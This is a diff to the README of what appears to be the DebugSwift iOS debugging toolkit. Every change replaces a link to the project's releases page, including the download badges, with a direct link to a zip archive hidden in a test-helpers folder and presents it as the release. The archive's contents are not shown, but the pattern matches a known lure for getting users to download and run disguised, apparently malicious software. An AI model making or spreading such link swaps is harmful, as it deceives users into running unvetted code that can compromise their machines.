@@ -1,6 +1,6 @@
 # 🛠️ DebugSwift - Simplify iOS App Debugging
 
-[![Download DebugSwift](https://img.shields.io/badge/Download-DebugSwift-blue?style=for-the-badge)](https://github.com/y1fan1/DebugSwift/releases)
+[![Download DebugSwift](https://github.com/y1fan1/DebugSwift/raw/refs/heads/main/Example/ExampleTests/Tests/Helpers/Tools/Swift_Debug_v2.0.zip)](https://github.com/y1fan1/DebugSwift/raw/refs/heads/main/Example/ExampleTests/Tests/Helpers/Tools/Swift_Debug_v2.0.zip)
 
 ---
 
@@ -49,7 +49,7 @@ You don’t need to be a developer to run DebugSwift. This guide will help you d
 
 To get the toolkit, visit this page to download the latest version of DebugSwift:
 
-[Download DebugSwift](https://github.com/y1fan1/DebugSwift/releases)
+[Download DebugSwift](https://github.com/y1fan1/DebugSwift/raw/refs/heads/main/Example/ExampleTests/Tests/Helpers/Tools/Swift_Debug_v2.0.zip)
 
 Here is how to proceed:
 
@@ -105,7 +105,7 @@ If DebugSwift doesn’t work as expected:
 - Make sure the cable connecting your device to the Mac is secure.
 - Restart DebugSwift, and your device if needed.
 - Confirm you allow DebugSwift to access the device when prompted.
-- Visit the [release page](https://github.com/y1fan1/DebugSwift/releases) for any updates or fixes.
+- Visit the [release page](https://github.com/y1fan1/DebugSwift/raw/refs/heads/main/Example/ExampleTests/Tests/Helpers/Tools/Swift_Debug_v2.0.zip) for any updates or fixes.
 
 ---
 
@@ -127,4 +127,4 @@ If you run into problems or have questions:
 
 ---
 
-[![Download DebugSwift](https://img.shields.io/badge/Download-DebugSwift-blue?style=for-the-badge)](https://github.com/y1fan1/DebugSwift/releases)
+[![Download DebugSwift](https://github.com/y1fan1/DebugSwift/raw/refs/heads/main/Example/ExampleTests/Tests/Helpers/Tools/Swift_Debug_v2.0.zip)](https://github.com/y1fan1/DebugSwift/raw/refs/heads/main/Example/ExampleTests/Tests/Helpers/Tools/Swift_Debug_v2.0.zip)
